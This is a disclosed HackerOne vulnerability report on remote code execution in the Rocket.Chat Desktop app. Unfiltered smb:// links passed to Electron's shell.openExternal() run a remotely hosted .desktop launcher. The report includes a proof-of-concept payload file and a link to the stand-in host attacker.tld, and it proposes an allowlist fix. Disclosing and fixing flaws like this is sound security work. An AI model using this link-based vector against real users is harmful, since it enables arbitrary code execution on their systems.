# Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE

## Report Details
- **Report ID**: 924151
- **URL**: https://hackerone.com/reports/924151
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-07-15T10:00:26.071Z
- **Disclosed**: 2022-08-01T10:17:37.113Z

## Reporter
- **Username**: baltpeter
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.

**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.

## Releases Affected:

  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron

## Steps To Reproduce (from initial installation to vulnerability):

  1. Install Rocket.Chat Desktop on Xubuntu 20.04.
  2. Login and join a channel.
  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:
     
     ```ini
    [Desktop Entry]
    Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
    Type=Application
     ```
  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`
  5. Click the link and (if necessary) confirm starting the untrusted launcher.
  6. Notice the calculator and message box appearing, confirming remote code execution.

## Supporting Material/References:

  * I have attached a video of the attack to the report.

## Suggested mitigation

  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.

Best Regards,  
Benjamin Altpeter  
Technical University of Braunschweig, Germany

## Impact

* The attack can be triggered remotely by an attacker by simply sending a message to a channel.
  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.

## Attachments
- rocketchat.mp4
